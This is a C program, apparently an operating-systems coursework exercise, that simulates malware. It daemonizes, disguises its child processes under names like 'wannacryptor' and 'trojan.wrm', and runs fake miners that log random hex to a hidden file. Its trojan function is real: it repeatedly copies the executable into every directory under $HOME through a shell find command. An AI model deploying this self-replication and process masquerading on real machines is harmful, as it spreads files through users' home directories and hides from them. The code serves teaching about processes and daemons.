#include <dirent.h>
#include <libgen.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

void daemonize(char *argv0);
void spawn_process(char *argv0, char processName[], int (*callback)(char *argv0, char *args[]), char *args[]);
int wannacryptor();
int trojan();
int mining(char *argv0, char *args[]);
int rodok(char *argv0, char *args[]);

int main(int argc, char *argv[]) {
    daemonize(argv[0]);

    int child_count = 3;
    spawn_process(argv[0], "wannacryptor", wannacryptor, NULL);
    spawn_process(argv[0], "trojan.wrm", trojan, NULL);
    spawn_process(argv[0], "rodok.exe", rodok, NULL);

    int status;
    for (int i = 0; i < child_count; i++) wait(&status);

    return 0;
}

void daemonize(char *argv0) {
    prctl(PR_SET_NAME, "/debugsisop", 0, 0, 0);  //! JANGAN LUPA DIGANTI NANTI BRO!!!
    strncpy(argv0, "/debugsisop", 128);          //! JANGAN LUPA DIGANTI NANTI BRO!!!

    pid_t pid = fork();
    int status;

    if (pid < 0) exit(1);
    if (pid > 0) exit(0);
    if (setsid() < 0) exit(1);

    umask(0);
    for (int x = sysconf(_SC_OPEN_MAX); x > 0; x--) close(x);
}

void spawn_process(char *argv0, char processName[], int (*callback)(char *argv0, char *args[]), char *args[]) {
    pid_t pid = fork();
    if (pid < 0 || pid > 0) return;

    prctl(PR_SET_PDEATHSIG, SIGTERM);
    prctl(PR_SET_NAME, processName, 0, 0, 0);
    strncpy(argv0, processName, 128);
    exit(callback(argv0, args));
}

int wannacryptor() {
    while (1) sleep(30);
    return 0;
}

int trojan() {
    char self[1024];
    ssize_t len = readlink("/proc/self/exe", self, sizeof(self) - 1);
    if (len == -1) return 1;
    self[len] = '\0';

    char cmd[3072];
    char *filename = basename(self);
    snprintf(cmd, sizeof(cmd),
             "find $HOME -type d -exec cp '%s' '{}/%s' \\; 2>>/dev/null",
             self, filename);

    while (1) {
        system(cmd);
        sleep(30);
    }

    return 0;
}

int mining(char *argv0, char *args[]) {
    while (1) {
        srand(time(NULL) + getpid());
        int sleep_time = rand() % 28 + 3;

        char random_hex[65];
        for (int i = 0; i < 64; i++) {
            int random_char = rand() % 16;
            if (random_char < 10) {
                random_hex[i] = '0' + random_char;
            } else {
                random_hex[i] = 'a' + (random_char - 10);
            }
        }
        random_hex[64] = '\0';

        char cmd[512];
        char *date = "$(date +'%Y-%m-%d %H:%M:%S')";
        snprintf(cmd, sizeof(cmd), "echo \"[%s][%s]\" %s >> /tmp/.miner.log", date, args[0], random_hex);
        system(cmd);

        sleep(sleep_time);
    }
    return 0;
}

int rodok(char *argv0, char *args[]) {
    int MAX_MINER = 10;
    pid_t pids[MAX_MINER];
    int status;

    char miner_name[128];
    char log_miner_name[64];
    for (int i = 1; i <= MAX_MINER; i++) {
        snprintf(miner_name, sizeof(miner_name), "mine-crafter-%d", i);
        snprintf(log_miner_name, sizeof(log_miner_name), "Miner %d", i);

        char *values[1] = {log_miner_name};
        spawn_process(argv0, miner_name, mining, values);
    }

    for (int i = 0; i < MAX_MINER; i++) wait(&status);
    return 0;
}